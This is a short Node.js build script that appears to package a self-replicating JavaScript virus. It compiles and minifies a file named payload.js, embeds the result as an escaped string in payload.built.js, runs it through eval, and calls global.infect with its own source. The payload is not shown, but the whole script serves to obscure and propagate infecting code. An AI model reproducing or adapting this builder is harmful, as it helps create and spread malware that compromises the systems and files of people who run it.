const fs   = require( "fs-extra" );
const exec = require( "child-process-promise" ).exec;

function escape(str) {
    return str.replace(/[\\"]/g, "\\$&");
}

async function build() {

    var src = "payload.js";
    var compiled = ".build/payload.compiled.js";
    var minified = ".build/payload.min.js";
        
    var tgt = "payload.built.js";

    await fs.ensureDir( ".build" );
    await exec( `cat ${src} | ./node_modules/.bin/babel -o ${compiled} --presets es2015` );
    await exec( `./node_modules/.bin/uglifyjs --mangle --compress -o ${minified} ${compiled}` );

    var raw = await fs.readFile( minified, "utf-8" );
    await fs.writeFile( tgt, `(function() {
        var payload = "${ escape( raw ) }";
        var decoded = decodeURI(payload);
        eval(decoded);
        global.infect(payload);
    })();` );
}

build();
